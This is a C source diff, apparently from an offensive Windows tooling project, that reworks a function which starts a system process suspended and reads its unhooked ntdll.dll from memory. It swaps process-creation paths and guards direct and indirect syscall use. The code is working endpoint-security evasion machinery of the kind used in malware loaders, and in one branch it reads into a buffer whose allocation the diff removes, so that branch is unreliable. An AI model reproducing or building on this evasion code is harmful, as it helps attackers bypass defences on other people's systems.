@@ -42,9 +42,9 @@ BOOL ReadNtdllFromASuspendedProcess(IN PWSTR pwProcessName, OUT PVOID* ppNtdllBu
 	swprintf_s(wcProcessPath, MAX_PATH, L"\\??\\%s\\System32\\%s", wcWinPath, pwProcessName);
 	
 	WDebugPrint("[i] Running : \"%s\" As A Suspended Process... \n", pwProcessName);
-#ifdef HW_INDIRECT_SYSCALL
-	if (!CreateSuspendedProcessWithSyscall(pwProcessName, &Pi)) {
-		DebugPrint("[!] CreateSuspendedProcessWithSyscall Failed\n");
+
+	if (!CreateSuspendedProcess(pwProcessName, &Pi, NULL, NULL)) {
+		DebugPrint("[!] CreateSuspendedProcess Failed\n");
 		return FALSE;
 	}
 
@@ -60,7 +60,7 @@ BOOL ReadNtdllFromASuspendedProcess(IN PWSTR pwProcessName, OUT PVOID* ppNtdllBu
 		DebugPrint("[!] HeapAlloc Failed.\n");
 		goto _EndOfFunc;
 	}
-
+#ifdef SYSCALL_ENABLED
 	// Prepare the syscall for NtReadVirtualMemory
 	NtReadVirtualMemory_t pNtReadVirtualMemory = (NtReadVirtualMemory_t)PrepareSyscall((char*)("NtReadVirtualMemory"));
 	if (!pNtReadVirtualMemory) {
@@ -90,31 +90,6 @@ BOOL ReadNtdllFromASuspendedProcess(IN PWSTR pwProcessName, OUT PVOID* ppNtdllBu
 		DebugPrint("[+] Process Terminated Successfully.\n");
 	}
 #else
-	if (!CreateProcessA(
-		NULL,
-		(LPSTR)wcProcessPath,
-		NULL,
-		NULL,
-		FALSE,
-		DEBUG_PROCESS,	
-		NULL,
-		NULL,
-		&Si,
-		&Pi)) {
-		DebugPrint("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
-		goto _EndOfFunc;
-	}
-	DebugPrint("[+] DONE \n");
-	DebugPrint("[i] Suspended Process Created With Pid : %d \n", Pi.dwProcessId);
-
-
-	// allocating enough memory to read ntdll from the remote process
-	sNtdllSize = GetNtdllSizeFromBaseAddress((PBYTE)pNtdllModule);
-	if (!sNtdllSize)
-		goto _EndOfFunc;
-	pNtdllBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNtdllSize);
-	if (!pNtdllBuffer)
-		goto _EndOfFunc;
 
 	// reading ntdll.dll
 	if (!ReadProcessMemory(Pi.hProcess, pNtdllModule, pNtdllBuffer, sNtdllSize, &sNumberOfBytesRead) || sNumberOfBytesRead != sNtdllSize) {
